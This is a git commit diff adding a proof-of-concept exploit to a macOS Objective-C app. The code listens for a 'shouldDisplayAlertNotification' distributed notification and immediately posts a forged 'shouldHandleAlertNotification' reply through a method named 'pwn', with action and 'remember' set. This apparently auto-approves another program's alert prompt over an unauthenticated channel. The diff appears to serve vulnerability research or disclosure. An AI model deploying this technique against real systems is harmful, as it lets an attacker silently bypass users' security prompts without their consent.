58634febf0242de66439bba5ae2fbfe65ceff9c9
Arnaud <noar@melomac.com>
2015-05-21 13:17:11 +0200

    NSDistributedNotificationCenter PoC

--- notifyi/AppDelegate.m
+++ notifyi/AppDelegate.m
@@ -18,7 +18,31 @@
 
 - (void)fyi:(NSNotification *)notification
 {
+	/*
+	
+	IMPORTANT
+	
+	NSDistributedNotificationCenter does not implement a secure communications protocol.
+	When using distributed notifications, your app should treat any data passed in the notification as untrusted.
+	See Security Overview for general guidance on secure coding practices.
+	
+	*/
+	
+	if ([notification.name isEqualToString:@"shouldDisplayAlertNotification"])
+	{
+		[self pwn:[notification userInfo]];
+	}
+
 	NSLog(@"%@", notification);
+}
+
+- (void)pwn:(NSDictionary *)userInfo
+{
+	NSDistributedNotificationCenter *center = [NSDistributedNotificationCenter defaultCenter];
+	
+	NSDictionary *pwnInfo = @{ @"action": @(1), @"remember": @(1), @"watchEventUUID": userInfo[@"watchEventUUID"] };
+	
+	[center postNotificationName:@"shouldHandleAlertNotification" object:nil userInfo:pwnInfo options:NSNotificationDeliverImmediately|NSNotificationPostToAllSessions];
 }
 
 @end
